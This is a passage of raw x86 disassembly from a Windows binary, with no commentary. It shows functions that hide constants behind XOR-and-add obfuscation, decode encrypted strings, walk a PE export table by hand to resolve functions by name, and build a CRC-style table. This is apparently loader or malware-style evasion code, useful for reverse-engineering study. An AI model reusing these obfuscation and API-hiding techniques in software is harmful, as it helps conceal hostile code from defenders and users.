  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
